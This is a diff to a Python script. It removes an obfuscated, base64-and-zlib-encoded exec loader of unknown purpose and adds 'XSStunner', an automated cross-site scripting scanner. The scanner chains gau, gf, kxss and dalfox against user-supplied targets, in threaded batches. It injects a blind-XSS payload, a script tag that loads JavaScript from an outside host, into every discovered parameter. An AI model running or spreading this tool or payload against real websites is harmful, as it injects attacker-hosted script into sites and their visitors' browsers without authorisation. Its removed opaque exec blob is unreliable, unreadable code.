@@ -1,4 +1,180 @@
+import subprocess
+import os
+import logging
+from pathlib import Path
+import threading
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# ANSI color codes for text formatting
+RED = '\033[1;31m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+CYAN = '\033[1;36m'
+WHITE = '\033[1;37m'
+RESET = '\033[0m'
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+
+# Function to display a banner
+def banner():
+    os.system("clear")
+    print(f"{CYAN}?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????")
+    print(f"???    {WHITE}XSStunner {CYAN} - {GREEN}Automated XSS Scanning Tool         ???")
+    print(f"???                                                     ???")
+    print(f"???        {RED}Created by anonre {CYAN}| {RED}Ethical Hacking Only{CYAN}     ???")
+    print(f"???                                                     ???")
+    print(f"???   {YELLOW}?????????????????????????????????????????????????????????????????????????????????????????????????????????{RESET}               ???")
+    print(f"???      {CYAN}Prepare for a journey into the unknown...      ???")
+    print(f"?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????")
+    print(f"{RESET}")
+
+# Function to print colored messages
+def print_message(color, message):
+    print(f"{color}{message}{RESET}")
+
+# Check if required dependencies are installed
+def check_dependencies():
+    dependencies = ["gau", "gf", "uro", "Gxss", "kxss", "dalfox", "tee"]
+    for cmd in dependencies:
+        try:
+            subprocess.run(f"command -v {cmd}", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        except subprocess.CalledProcessError:
+            logging.error(f"[!] Dependency {cmd} not found. Please install it first.")
+            exit(1)
+
+# Run gau and filter XSS-related results
+def run_gau_and_filter(target, output_dir):
+    try:
+        print_message(BLUE, f"[*] Running XSS search for target: {target}")
+        with open(f"{output_dir}/xss_output.txt", "w") as output_file:
+            subprocess.run(
+                f"echo {target} | gau | gf xss | uro | Gxss | kxss | tee {output_file.name}",
+                shell=True, stdout=output_file, stderr=subprocess.PIPE, check=True
+            )
+    except Exception as e:
+        logging.error(f"Error running gau and filter: {e}")
+        exit(1)
+
+# Process the results and filter unique URLs
+def process_results(output_dir):
+    try:
+        print_message(YELLOW, "[*] Processing results and filtering URLs...")
+        with open(f"{output_dir}/xss_output.txt", "r") as file:
+            urls = set()
+            for line in file:
+                if line.startswith("URL: "):
+                    url = line.split('URL: ')[1].split('=')[0] + '='
+                    urls.add(url)
+        with open(f"{output_dir}/final.txt", "w") as final_file:
+            for url in sorted(urls):
+                final_file.write(url + "\n")
+    except Exception as e:
+        logging.error(f"Error processing results: {e}")
+        exit(1)
+
+# Run Dalfox on the filtered URLs
+def run_dalfox(output_dir):
+    try:
+        print_message(GREEN, "[*] Running Dalfox with XSSHunter payload...")
+        subprocess.run(
+            f"dalfox file {output_dir}/final.txt --custom-payload '\"><script src=\"https://js.rip/px592rfcv0\"></script>' --output {output_dir}/dalfox_results.txt", # change costum payload with yours
+            shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+    except Exception as e:
+        logging.error(f"Error running Dalfox: {e}")
+        exit(1)
+
+# Process a single target
+def process_single_target():
+    target = input(f"{CYAN}Enter target: {RESET}")
+    
+    # Create directory for storing results
+    output_dir = Path(f"results/{target}")
+    output_dir.mkdir(parents=True, exist_ok=True)
+    
+    print_message(WHITE, f"[*] Creating results directory at: {output_dir}")
+
+    # Run the main scanning process
+    run_gau_and_filter(target, output_dir)
+
+    # Process the results to filter URLs
+    process_results(output_dir)
+
+    # Run Dalfox to scan the final list of URLs
+    run_dalfox(output_dir)
+
+    # Final message after the process is done for this target
+    print_message(GREEN, f"[???] Process completed for target {target}! Results saved in: {output_dir}")
+
+# Function to process each target in a thread
+def process_target_thread(target):
+    output_dir = Path(f"results/{target}")
+    output_dir.mkdir(parents=True, exist_ok=True)
+    print_message(WHITE, f"[*] Creating results directory at: {output_dir}")
+
+    # Run the main scanning process
+    run_gau_and_filter(target, output_dir)
+
+    # Process the results to filter URLs
+    process_results(output_dir)
+
+    # Run Dalfox to scan the final list of URLs
+    run_dalfox(output_dir)
+
+    # Final message after the process is done for this target
+    print_message(GREEN, f"[???] Process completed for target {target}! Results saved in: {output_dir}")
+
+# Process multiple targets with dynamic threading (3 threads at a time)
+def process_multiple_targets():
+    file_path = input(f"{CYAN}Enter the path of the file containing target list: {RESET}")
+    
+    # Check if the file exists
+    if not Path(file_path).exists():
+        logging.error(f"[!] File {file_path} not found.")
+        exit(1)
+
+    # Read targets from the file
+    with open(file_path, "r") as file:
+        targets = [line.strip() for line in file.readlines() if line.strip()]
+
+    if not targets:
+        logging.error("[!] File does not contain valid targets.")
+        exit(1)
+
+    # Create and start threads dynamically (3 threads at a time)
+    thread_lock = threading.Semaphore(5)  # Limit the number of concurrent threads to 3
+    threads = []
+
+    def worker(target):
+        with thread_lock:
+            process_target_thread(target)
+
+    # Start threads for each target
+    for target in targets:
+        thread = threading.Thread(target=worker, args=(target,))
+        threads.append(thread)
+        thread.start()
+
+    # Wait for all threads to complete
+    for t in threads:
+        t.join()
+
+# Main function
+def main():
+    banner()
+    
+    # Ask the user whether to process a single target or multiple targets
+    choice = input(f"{CYAN}Choose an option:\n1. Single Target\n2. Multiple Targets\nEnter choice (1/2): {RESET}")
+    
+    if choice == "1":
+        process_single_target()
+    elif choice == "2":
+        process_multiple_targets()
+    else:
+        logging.error("[!] Invalid choice. Exiting program.")
+        exit(1)
+
+if __name__ == "__main__":
+    check_dependencies()
+    main()
